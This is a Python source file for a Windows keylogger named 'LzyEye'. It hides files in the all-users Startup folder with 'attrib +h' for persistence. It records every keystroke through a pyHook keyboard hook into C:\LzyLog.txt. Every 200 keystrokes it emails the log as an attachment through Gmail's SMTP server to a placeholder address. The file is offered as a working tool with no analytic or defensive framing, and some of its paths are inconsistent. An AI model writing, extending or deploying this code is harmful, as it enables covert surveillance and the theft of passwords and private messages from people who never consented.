import getpass
import socket
import os
#https://ss64.com/nt/xcopy.html < how to use xcopy

#Snippet hides the LzyEye.py in the startup folder.
Lzy_hide = open ("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\LzyEyes.py","+w")
filename = "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\LzyEye.py"
p = os.popen('attrib +h ' + filename)
nah = p.read()
p.close()
#Break new function###################################################Break#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
Lzy_hide = open ("C:\LzyLog.txt","+w")
filename = "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\LzyLog.txt"
p = os.popen('attrib +h ' + filename)
nah = p.read()
p.close()




class logs():
    x = 0
def emool():
	import smtplib
	from email.mime.multipart import MIMEMultipart
	from email.mime.text import MIMEText
	from email.mime.base import MIMEBase
	from email import encoders
 
	fromaddr = "Email here"
	toaddr = "Email here"
 
	msg = MIMEMultipart()
 
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "Lzy Log Sent"
 
	body = "LzyLog has been sent"
 
	msg.attach(MIMEText(body, 'plain'))
 
	filename = "LzyLog.txt"
	attachment = open("C:\LzyLog.txt", "rb")
 
	part = MIMEBase('application', 'octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
	msg.attach(part)
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(fromaddr, "password")
	text = msg.as_string()
	server.sendmail(fromaddr, toaddr, text)
	server.quit()
	print ("Email sent")
	logs.x = 0
	print (logs.x)
	return True




    
import pyHook, pythoncom, sys, logging
file_log = 'C:\LzyLog.txt'
def OnKeyboardEvent(event):
	print (logs.x)
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	if logs.x == 200:
		logs.x = 0
		emool();
	else:
		logs.x = logs.x+1
		return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
